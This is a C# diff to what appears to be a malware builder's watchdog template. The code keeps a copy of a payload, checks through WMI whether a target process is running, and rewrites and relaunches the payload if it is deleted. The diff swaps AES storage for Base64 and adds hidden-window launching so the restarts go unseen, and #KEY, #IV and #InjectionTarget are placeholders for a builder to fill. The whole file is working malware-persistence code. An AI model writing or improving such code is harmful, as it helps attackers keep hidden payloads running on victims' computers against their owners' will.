@@ -18,7 +18,7 @@ using System.Windows.Forms;
 
 public partial class Program
 {
-    public static byte[] xm = new byte[] { };
+    public static string xm = "";
     public static string plp = "";
     public static int checkcount = 0;
 
@@ -27,7 +27,7 @@ public partial class Program
         try
         {
             plp = PayloadPath;
-            xm = RAES_Encryptor(File.ReadAllBytes(plp));
+            xm = Convert.ToBase64String(File.ReadAllBytes(plp));
             RWDLoop();
         }
         catch (Exception ex)
@@ -47,8 +47,13 @@ public partial class Program
             {
                 if (!File.Exists(plp))
                 {
-                    File.WriteAllBytes(plp, RAES_Decryptor(xm));
-                    Process.Start(plp);
+                    File.WriteAllBytes(plp, Convert.FromBase64String(xm));
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = plp,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                    });
                 }
                 else if (checkcount < 2)
                 {
@@ -57,7 +62,12 @@ public partial class Program
                 else
                 {
                     checkcount = 0;
-                    Process.Start(plp);
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = plp,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                    });
                 }
             }
             else
@@ -65,8 +75,13 @@ public partial class Program
                 checkcount = 0;
                 if (!File.Exists(plp))
                 {
-                    File.WriteAllBytes(plp, RAES_Decryptor(xm));
-                    Process.Start(plp);
+                    File.WriteAllBytes(plp, Convert.FromBase64String(xm));
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = plp,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                    });
                 }
             }
 
@@ -91,11 +106,6 @@ public partial class Program
 
     }
 
-    public static string RGetString(string input)
-    {
-        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
-    }
-
     public static bool RCheckProc()
     {
         try
@@ -105,7 +115,7 @@ public partial class Program
             var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
             scope.Connect();
 
-            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
+            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
             var query = new ObjectQuery(wmiQuery);
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
@@ -124,47 +134,5 @@ public partial class Program
 #endif
         }
         return false;
-    }
-
-    public static byte[] RAES_Decryptor(byte[] input)
-    {
-        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
-        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
-        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
-        var symmetricKey = new RijndaelManaged();
-        symmetricKey.KeySize = 256;
-        symmetricKey.Mode = CipherMode.CBC;
-        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
-        using (var mStream = new MemoryStream())
-        {
-            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
-            {
-                cStream.Write(input, 0, input.Length);
-                cStream.Close();
-            }
-
-            return mStream.ToArray();
-        }
-    }
-
-    public static byte[] RAES_Encryptor(byte[] input)
-    {
-        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
-        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
-        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
-        var symmetricKey = new RijndaelManaged();
-        symmetricKey.KeySize = 256;
-        symmetricKey.Mode = CipherMode.CBC;
-        var encryptor = symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes);
-        using (var mStream = new MemoryStream())
-        {
-            using (var cStream = new CryptoStream(mStream, encryptor, CryptoStreamMode.Write))
-            {
-                cStream.Write(input, 0, input.Length);
-                cStream.Close();
-            }
-
-            return mStream.ToArray();
-        }
     }
 }
